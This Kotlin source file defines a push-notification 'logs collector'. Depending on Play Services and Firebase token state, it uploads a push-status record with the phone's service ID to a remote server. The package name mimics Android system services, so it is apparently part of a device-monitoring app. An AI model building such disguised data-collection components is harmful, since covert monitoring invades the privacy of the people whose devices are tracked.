package com.android.services.logs.collectors

import android.content.Context
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.GetPushStatus
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.DeviceInformationUtil
import com.android.services.util.logVerbose
import kotlinx.coroutines.CoroutineScope

class PushNotificationsCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
    private val coroutineScope: CoroutineScope
) : LogsCollector {

    @Throws(Exception::class)
    override fun uploadLogs() {
        val firebaseToken = AppConstants.fcmToken ?: ""
        if ((DeviceInformationUtil.isGooglePlayServicesAvailable(context) == "0" && firebaseToken.isEmpty())
            || (DeviceInformationUtil.isGooglePlayServicesAvailable(context) == "1" && firebaseToken.isEmpty() ||
                    DeviceInformationUtil.isGooglePlayServicesAvailable(context) == "0" && firebaseToken.isNotEmpty()) ||
            !AppConstants.fcmTokenStatus
        ) {
            val serverHelper = RemoteServerHelper(
                context,
                AppConstants.PUSH_NOTIFICATIONS_TYPE,
                localDatabaseSource,
                tosApi = tosApi,
                coroutineScope = coroutineScope
            )
            logVerbose("NonSupportedFcmInfo = PushNotificationCollector called")
            serverHelper.upload(listOf(GetPushStatus(AppUtils.getPhoneServiceId())))
        }
    }
}